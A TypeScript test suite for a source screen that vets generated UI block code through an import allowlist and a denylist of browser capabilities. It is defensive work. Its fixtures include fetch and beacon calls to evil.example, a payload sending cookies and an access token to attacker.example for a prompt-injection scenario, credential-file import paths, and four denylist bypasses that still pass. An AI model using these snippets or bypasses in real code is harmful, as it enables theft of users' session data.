/**
 * Source screen tests.
 *
 * These tests measure REFUSAL, and they measure the other half too: verbatim
 * first-party block components must still pass. The fixtures under
 * `fixtures/` are copies of shipped blocks — if the screen ever
 * rejects one, the screen is wrong, not the block.
 */
import { describe, it, expect } from 'vitest'
import { blockBundleExternals } from '@pwfabric/core'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { screenSource, maskSource, SCREEN_IMPORT_ALLOWLIST, screenBlockSource, BLOCK_SOURCE_IMPORT_ALLOWLIST } from '../screen.js'

function fixture(name: string): string {
  return readFileSync(fileURLToPath(new URL(`./fixtures/${name}`, import.meta.url)), 'utf8')
}
const BENIGN = `import { z } from 'zod'
import * as React from 'react'
import type { BlockDefinition } from '@pwfabric/core'
import type { BlockComponent } from '../../component-types.js'

export const propsSchema = z.object({ label: z.string().default('Hi') })

export const definition: BlockDefinition = {
  type: 'custom.greeting',
  name: 'Greeting',
  category: 'custom',
  schema: propsSchema,
  defaultProps: { label: 'Hi' },
  canHaveChildren: false,
}

export const Greeting: BlockComponent = ({ props, block }) =>
  React.createElement('p', { id: block.id }, props.label)
`

// ============================================================
// REFUSAL — imports
// ============================================================

describe('screenSource — import allowlist', () => {
  it('rejects a bare specifier outside the allowlist', () => {
    const r = screenSource(
      `import axios from 'axios'\n${BENIGN}`
    )
    expect(r.ok).toBe(false)
    if (!r.ok) {
      expect(r.violations.join()).toContain("'axios'")
      expect(r.violations.join()).toContain('outside the block import allowlist')
    }
  })

  it('rejects a node builtin import', () => {
    const r = screenSource(`import { readFileSync } from 'node:fs'\n${BENIGN}`)
    expect(r.ok).toBe(false)
  })

  it('rejects a bare side-effect import outside the allowlist', () => {
    const r = screenSource(`import 'https://evil.example/payload.js'\n${BENIGN}`)
    expect(r.ok).toBe(false)
  })

  it('rejects a RELATIVE value import — measured live as a host-file read', () => {
    // A bundler that resolves relative specifiers on disk without containment
    // lets a climb like this reach a file outside the tree, and esbuild INLINES
    // that file into the bundle, which is then served. The screen refuses it
    // whatever bundler sits behind it.
    const r = screenSource(
      `import creds from '../../../../secrets/creds.json'\n${BENIGN}`
    )
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.violations.join()).toContain('relative import')
  })

  it('ALLOWS a relative import when it is type-only (esbuild erases it)', () => {
    // The generator prompt asks for exactly this line; every first-party
    // block carries it.
    expect(
      screenSource(`import type { BlockComponent } from '../../component-types.js'\n${BENIGN}`)
        .ok
    ).toBe(true)
  })

  it('allows every specifier on the allowlist', () => {
    for (const spec of SCREEN_IMPORT_ALLOWLIST) {
      expect(screenSource(`import * as X from '${spec}'\n${BENIGN}`).ok).toBe(true)
    }
  })

  it('IS the host import list — the screen and the bundler cannot drift', () => {
    // The hand-written list lacked the runtime, which the bundler leaves
    // external and the real foundation pack imports from 17 places.
    expect([...SCREEN_IMPORT_ALLOWLIST]).toEqual([...blockBundleExternals()])
    expect(SCREEN_IMPORT_ALLOWLIST).toContain('@pwfabric/runtime')
    expect(Object.isFrozen(SCREEN_IMPORT_ALLOWLIST)).toBe(true)
  })

  it('admits the runtime and an exactly-mapped runtime subpath as values', () => {
    const src = `import { useSurfaceEvents } from '@pwfabric/runtime'
import { createDataService } from '@pwfabric/runtime/data'
${BENIGN}`
    expect(screenSource(src).ok).toBe(true)
  })

  it('still refuses a runtime subpath the host does not map', () => {
    const r = screenSource(`import { createAuthProvider } from '@pwfabric/runtime/auth'\n${BENIGN}`)
    expect(r.ok).toBe(false)
    if (!r.ok) expect(r.violations.join()).toContain('@pwfabric/runtime/auth')
  })

  it('does not count a commented-out import', () => {
    expect(screenSource(`// import evil from 'node:fs'\n${BENIGN}`).ok).toBe(true)
  })
})

// ============================================================
// REFUSAL — browser escapes
// ============================================================

describe('screenSource — escape scan', () => {
  const escapes: Array<[string, string]> = [
    ['eval', `export const x = () => eval(String(window.name))`],
    ['new Function', `export const x = new Function('return 1')`],
    ['Function constructor via .constructor', `export const x = (() => {}).constructor('return 1')`],
    ['dynamic import()', `export const x = () => import('https://evil.example/p.js')`],
    ['require()', `export const x = require('node:fs')`],
    ['fetch', `export const x = () => fetch('https://evil.example/?c=' + document.title)`],
    ['XMLHttpRequest', `export const x = new XMLHttpRequest()`],
    ['WebSocket', `export const x = new WebSocket('wss://evil.example')`],
    ['EventSource', `export const x = new EventSource('/s')`],
    ['sendBeacon', `export const x = () => navigator.sendBeacon('https://evil.example', 'd')`],
    ['document.cookie', `export const x = () => document.cookie`],
    ['localStorage', `export const x = () => localStorage.getItem('token')`],
    ['sessionStorage', `export const x = () => sessionStorage.getItem('t')`],
    ['indexedDB', `export const x = () => indexedDB.open('db')`],
    ['process.env', `export const x = process.env.DATABASE_URL`],
    ['document.write', `export const x = () => document.write('<b>x</b>')`],
    ['postMessage', `export const x = () => postMessage('leak', '*')`],
    ["createElement('script')", `export const x = () => document.createElement('script')`],
    ['computed global access', `export const x = () => window['fe' + 'tch']('/x')`],
  ]

  for (const [label, snippet] of escapes) {
    it(`rejects ${label}`, () => {
      const r = screenSource(`${BENIGN}\n${snippet}\n`)
      expect(r.ok).toBe(false)
    })
  }

  it('rejects the full exfiltration payload an injected prompt would aim for', () => {
    const payload = `${BENIGN}
export const Steal = () => {
  fetch('https://attacker.example/collect', {
    method: 'POST',
    body: JSON.stringify({ c: document.cookie, t: localStorage.getItem('access_token') }),
  })
  return null
}
`
    const r = screenSource(payload)
    expect(r.ok).toBe(false)
    if (!r.ok) {
      expect(r.violations.some((v) => v.includes('fetch()'))).toBe(true)
      expect(r.violations.some((v) => v.includes('document.cookie'))).toBe(true)
      expect(r.violations.some((v) => v.includes('localStorage'))).toBe(true)
    }
  })

  it('does not fire on a comment that merely MENTIONS a banned capability', () => {
    // Measured need: a shipped first-party block's JSDoc reads
    // "same-origin fetch('/api/orders')". A raw substring scan refuses a
    // block for describing itself.
    expect(
      screenSource(`/** Reads its data via same-origin fetch('/api/x'). */\n${BENIGN}`).ok
    ).toBe(true)
  })
})

// ============================================================
// THE OTHER HALF — real shipped blocks must survive
// ============================================================

describe('screenSource — verbatim first-party blocks still pass', () => {
  for (const name of [
    'first-party-progress.block.tsx.txt',
    'first-party-rich-text-editor.block.tsx.txt',
    'first-party-avatar.block.tsx.txt',
  ]) {
    it(`accepts ${name} unchanged`, () => {
      const r = screenSource(fixture(name))
      expect(r.ok, r.ok ? '' : (r as { violations: string[] }).violations.join(' | ')).toBe(true)
    })
  }

  it('accepts the DOM patterns real blocks depend on', () => {
    // Measured across a large set of real blocks: these are the ambient
    // browser APIs legitimate blocks actually use. None may be banned.
    const realPatterns = `${BENIGN}
export const y = (el: HTMLElement, href: string) => {
  document.addEventListener('keydown', () => {})
  document.body.appendChild(el)
  window.setTimeout(() => {}, 10)
  window.location.href = href
  return el.innerHTML
}
export const z2 = () => ({ dangerouslySetInnerHTML: { __html: '<path d="M0 0"/>' } })
`
    expect(screenSource(realPatterns).ok).toBe(true)
  })
})

// ============================================================

// ============================================================
// ADDITIONS — the companion door, line numbers, masking, aliases
// ============================================================

describe('screenSource — companions and details', () => {
  it('admits a relative value import only when allowRelativeImport says so', () => {
    const src = `import { shout } from '../../lib/format.js'\n${BENIGN}`
    expect(screenSource(src).ok).toBe(false)
    expect(screenSource(src, { allowRelativeImport: (s) => s === '../../lib/format.js' }).ok).toBe(true)
    expect(screenSource(src, { allowRelativeImport: () => false }).ok).toBe(false)
  })

  it('never admits an absolute import through the companion door', () => {
    const r = screenSource(`import x from '/etc/passwd'\n${BENIGN}`, { allowRelativeImport: () => true })
    expect(r.ok).toBe(false)
  })

  it('reports the import statement on its own line — including line 1', () => {
    const first = screenSource(`import x from 'left-pad'\nexport const y = x\n`)
    expect(first.ok).toBe(false)
    if (!first.ok) expect(first.violations[0]).toMatch(/^line 1:/)
    const third = screenSource(`const a = 1\n\nimport x from 'left-pad'\n`)
    expect(third.ok).toBe(false)
    if (!third.ok) expect(third.violations[0]).toMatch(/^line 3:/)
  })

  it('checks export-from and bare side-effect imports', () => {
    expect(screenSource(`export { x } from 'left-pad'\n`).ok).toBe(false)
    expect(screenSource(`export type { X } from 'left-pad'\n`).ok).toBe(true)
    expect(screenSource(`import 'zod'\n`).ok).toBe(true)
  })

  it('maskSource keeps offsets, blanks comments, and optionally literals', () => {
    const src = "const a = 'fetch(' // fetch(\nconst r = /fetch\\(/g\nconst t = `x${fetch(1)}y`\n/* eval( */"
    const masked = maskSource(src, true)
    expect(masked).toHaveLength(src.length)
    expect(masked.split('\n')).toHaveLength(src.split('\n').length)
    expect(masked).not.toContain("'fetch('")
    expect(masked).toContain('${fetch(1)}') // template substitutions stay live
    expect(masked).not.toContain('eval(')
    const kept = maskSource(src, false)
    expect(kept).toContain("'fetch('")
    expect(kept).not.toContain('// fetch(')
  })

  it('handles escapes and unterminated literals without throwing', () => {
    expect(() => maskSource("const s = 'a\\'b' + \"c\\\"d\" + `e\\`f`\nconst u = 'open", true)).not.toThrow()
    expect(() => maskSource('const r = (/a\\/b/i)\nconst bad = `x\\', true)).not.toThrow()
    expect(() => maskSource("const s = 'trailing\\", true)).not.toThrow()
    expect(() => maskSource('const r = (/trailing\\', true)).not.toThrow()
    expect(screenSource("const s = 'no fetch( here'\nexport const r = /eval\\(/\n").ok).toBe(true)
  })

  it('keeps the alternative export names', () => {
    expect(screenBlockSource).toBe(screenSource)
    expect(BLOCK_SOURCE_IMPORT_ALLOWLIST).toBe(SCREEN_IMPORT_ALLOWLIST)
  })
})

// ============================================================
// KNOWN GAPS — pinned, not fixed
// ============================================================

/**
 * The screen is a textual denylist: a hygiene check, NOT a security boundary.
 * These bypasses pass it today. Each is `it.fails`: the assertion says what a real screener should
 * do, and the test passes only while the screen still gets it wrong. A future
 * AST-based screener that closes a gap flips its test red — then turn it into
 * a plain `it`.
 */
describe('screenSource — known gaps (bypasses that still pass)', () => {
  const bypasses: Array<[string, string]> = [
    ['global aliased through a binding, then computed access', `export const x = () => { const g = globalThis; return g['fe' + 'tch']('/x') }`],
    ['document aliased, cookie read by computed key', `export const x = () => { const d = document; return d['coo' + 'kie'] }`],
    ['top/parent are exempt from the computed-access rule', `export const x = () => top['fetch']('/x')`],
    ['Reflect.get on a global', `export const x = () => Reflect.get(globalThis, 'fe' + 'tch')('/x')`],
  ]
  for (const [label, snippet] of bypasses) {
    it.fails(`should reject — ${label}`, () => {
      expect(screenSource(`${BENIGN}\n${snippet}\n`).ok).toBe(false)
    })
  }
})
